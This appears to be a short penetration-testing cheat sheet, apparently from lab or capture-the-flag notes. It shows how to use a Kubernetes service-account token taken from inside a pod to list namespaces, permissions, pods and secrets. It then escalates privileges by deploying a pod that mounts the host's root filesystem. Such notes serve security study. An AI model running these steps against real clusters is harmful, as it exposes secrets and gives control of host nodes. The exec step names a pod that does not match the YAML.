---
title: "Kubernetes"
date: 2024-7-22
tags: ["Kubernetes", "container", "privesc"]
---

---
### Token Location

```bash
/run/secrets/kubernetes.io/serviceaccount/token
```

### Certificate Location

```bash
/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

### Tools

[kubectl](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/)

### Basic Commands

```bash
# List all namespaces
kubectl --token <token> --certificate-authority ca.crt --server https://10.10.11.10:8443 get namespaces
```

```bash
# Get user permissions in current namespace
kubectl --token <token> --certificate-authority ca.crt --server https://10.10.11.10:8443 auth can-i --list
```

```bash
# Get user permissions in specific namespace
kubectl --token <token> --certificate-authority ca.crt --server https://10.10.11.10:8443 auth can-i --list -n <namespace_name>
```

```bash
# List all pods
kubectl --token <token> --certificate-authority ca.crt --server https://10.10.11.10:8443 get pods --all-namespaces
```

```bash
# List pods in specific namespace
kubectl --token <token> --certificate-authority ca.crt --server https://10.10.11.10:8443 get pods -n <namespace_name>
```

```bash
# Get YAML of a pod
kubectl --token <token> --certificate-authority ca.crt --server https://10.10.11.10:8443 get pod <pod_name> -o yaml
```

```bash
# Get info of a pod
kubectl --token <token> --certificate-authority ca.crt --server https://10.10.11.10:8443 describe pod <pod_name> -n <namespace_name>
```

```bash
# List secrets
kubectl --token <token> --certificate-authority ca.crt --server https://10.10.11.10:8443 get secrets -n <namespace_name>
```

```bash
# Get info of a secret
kubectl --token <token> --certificate-authority ca.crt --server https://10.10.11.10:8443 describe secret <secret_name> -n <namespace_name>
```

### Privesc

#### 1. Create a Malicious YAML (Template)

```
apiVersion: v1 
kind: Pod
metadata:
  name: alpine
  namespace: NAMESPACE_NAME
spec:
  containers:
  - name: test
    image: IMAGE_NAME
    command: ["/bin/sh"]
    args: ["-c", "sleep 300000"]
    volumeMounts: 
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:  
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

#### 2. Create a new pod

```bash
kubectl --token <token> --certificate-authority ca.crt --server https://10.10.11.10:8443 apply -f test.yaml
```

#### 3. Execute

```bash
kubectl --token <token> --certificate-authority ca.crt --server https://10.10.11.10:8443 exec test --stdin --tty -n <namespace_name>
```

```bash
# Check host filesystem
cd /mnt/root/
```

<br>